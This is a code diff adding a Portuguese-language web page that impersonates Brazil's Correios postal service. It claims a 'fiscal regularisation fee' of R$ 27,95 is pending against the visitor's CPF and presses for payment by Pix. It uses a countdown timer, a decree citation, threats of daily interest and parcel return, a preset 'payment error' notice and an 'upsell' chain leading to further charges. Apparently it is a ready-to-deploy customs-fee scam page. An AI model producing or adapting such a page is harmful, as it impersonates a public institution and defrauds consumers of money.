@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sistema de Liberação Alfandegária</title>
+  <link rel="icon" href="assets/logonova.png" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="upsell.css" />
+</head>
+<body>
+  <div class="content">
+    <!-- LOGO -->
+    <header class="uc-header">
+      <img src="assets/logonova.png" alt="Correios" />
+    </header>
+
+    <!-- BARRA AZUL -->
+    <div class="topbar">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      SISTEMA DE LIBERAÇÃO ALFANDEGÁRIA
+    </div>
+
+    <div class="uc-container">
+      <!-- STATUS -->
+      <div class="status-card paid">
+        <span class="status-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+        </span>
+        <div class="status-info">
+          <span class="status-title">Taxa de Despacho Postal</span>
+          <span class="badge paid">PAGO</span>
+        </div>
+      </div>
+
+      <div class="status-card pending">
+        <span class="status-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+        </span>
+        <div class="status-info">
+          <span class="status-title">Taxa de Regularização Fiscal</span>
+          <span class="badge pending">PENDENTE</span>
+        </div>
+      </div>
+
+      <!-- CARD PRINCIPAL -->
+      <div class="main-card">
+        <div class="card-head">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+          <h2>Pendência Identificada</h2>
+        </div>
+
+        <p class="lead">
+          Foi identificada uma <span class="hl">Taxa de Regularização Fiscal</span>
+          no valor de <strong>R$ 27,95</strong> vinculada ao seu CPF.
+        </p>
+
+        <div class="reason-box">
+          <div class="reason-label">MOTIVO DA COBRANÇA</div>
+          <p class="reason-text">
+            Conforme Art. 44 do Decreto nº 6.759/2009, encomendas com atraso superior a
+            15 dias na regularização estão sujeitas à Taxa de Regularização Fiscal para
+            emissão do comprovante de despacho aduaneiro.
+          </p>
+        </div>
+
+        <div class="timer-box">
+          <div class="timer-label">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+            Regularize em até
+          </div>
+          <div class="timer-display" data-timer="488">08<span class="sep">:</span>08</div>
+          <div class="timer-sub">para evitar juros e bloqueio</div>
+        </div>
+
+        <div class="value-box">
+          <span class="value-label">Valor da regularização:</span>
+          <span class="value-amount">R$ 27,95</span>
+        </div>
+
+        <p class="pay-error">Erro ao processar pagamento. Tente novamente.</p>
+
+        <button type="button" class="btn-primary js-pay"><img src="assets/pix-icon.png" class="btn-icon" alt="" /> REGULARIZAR AGORA</button>
+        <button type="button" class="btn-secondary js-pay">🔒 PAGAMENTO SEGURO VIA PIX</button>
+      </div>
+
+      <!-- CONSEQUÊNCIAS -->
+      <div class="consequences">
+        <div class="conseq-title">O NÃO PAGAMENTO PODE RESULTAR EM:</div>
+        <div class="conseq-item">
+          <span class="conseq-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg></span>
+          Cancelamento do processo de liberação
+        </div>
+        <div class="conseq-item">
+          <span class="conseq-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/><polyline points="17 6 23 6 23 12"/></svg></span>
+          Aplicação de juros de 2% ao dia
+        </div>
+        <div class="conseq-item">
+          <span class="conseq-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 2.13-9.36L1 10"/></svg></span>
+          Devolução da encomenda à origem
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <footer class="uc-footer">
+    Correios — Empresa Brasileira de Correios e Telégrafos
+  </footer>
+
+  <script src="tracking.js"></script>
+  <script src="pixels.js"></script>
+  <script>
+    window.UPSELL_CONFIG = {
+      valor: 27.95,
+      descricao: "Taxa de Regularização Fiscal",
+      next: "/upsell2"
+    };
+  </script>
+  <script src="upsell.js"></script>
+</body>
+</html>
